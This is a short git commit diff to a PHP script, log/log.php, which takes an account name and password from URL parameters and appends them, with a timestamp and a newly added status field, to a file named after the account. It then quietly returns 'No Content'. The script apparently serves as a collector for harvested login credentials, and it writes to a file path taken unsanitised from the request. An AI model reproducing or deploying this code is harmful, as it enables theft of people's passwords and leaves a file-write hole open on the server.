674ef5481dd8fdb2f0a78bbcebe854139a7d4bcd
irjdekker <ir.j.dekker@gmail.com>
2017-05-30 11:17:39 +0200

    Commit

--- log/log.php
+++ log/log.php
@@ -1,7 +1,8 @@
 <?php 
 $account = html_entity_decode(stripslashes($_GET["acc"])); 
 $password = html_entity_decode(stripslashes($_GET["pw"]));
-$req_dump = date("D M d, Y G:i", time()) . " : " . $account . " - " . $password . PHP_EOL;
+$status = html_entity_decode(stripslashes($_GET["stat"]));
+$req_dump = date("D M d, Y G:i", time()) . " : " . $account . " - " . $password . " - " . $status . PHP_EOL;
 $file = $account;
 $fp = file_put_contents($file, $req_dump, FILE_APPEND );
 header("HTTP/1.0 204 No Content");
